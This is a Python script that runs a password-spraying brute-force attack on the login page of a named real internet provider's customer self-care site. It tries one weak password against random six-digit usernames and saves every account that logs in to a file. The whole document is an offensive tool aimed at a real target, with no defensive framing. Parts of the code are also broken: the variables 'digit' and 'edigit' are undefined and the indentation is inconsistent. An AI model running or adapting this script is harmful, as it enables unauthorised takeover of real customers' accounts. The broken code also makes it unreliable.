import requests
from bs4 import BeautifulSoup
import random
import time

# Set the URL of the login form
base_url = "https://selfcare.carnival.com.bd"
url = base_url + "/login.php"

# Set the password to try
password = "12345678"

# Function to generate a random 6-digit username
def generate_username():
    return str(random.randint(digit,edigit))

# Function to perform the brute force attack
def brute_force_attack():
    while True:
        username = generate_username()
        # Parse the HTML using BS4
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        form = soup.find('form', {'class': 'login'})
        # Print the form details
        action = form['action']
        # Print the action URL
        data = {
            'username': username,
            'password': password
        }
        # Post the form data
        response = requests.post(base_url + action, data=data)
        # Print the response object
        # Print the response text
        soup = BeautifulSoup(response.content, 'html.parser')
        if soup.find('title').text == 'Carnival::Selfcare Dashboard':
           print(f"Login successful with username {username} and password {password}")
            print("Login successful! Continuing the attack...")
            with open("logged_in_ids.txt", "a") as f:
                f.write(f"{username}\n")
        else:
            print(f"Failed to login with username {username} and password {password}")
            print("Trying again...")
        time.sleep(1)  # Add a delay to avoid overwhelming the server

# Perform the brute force attack
brute_force_attack()
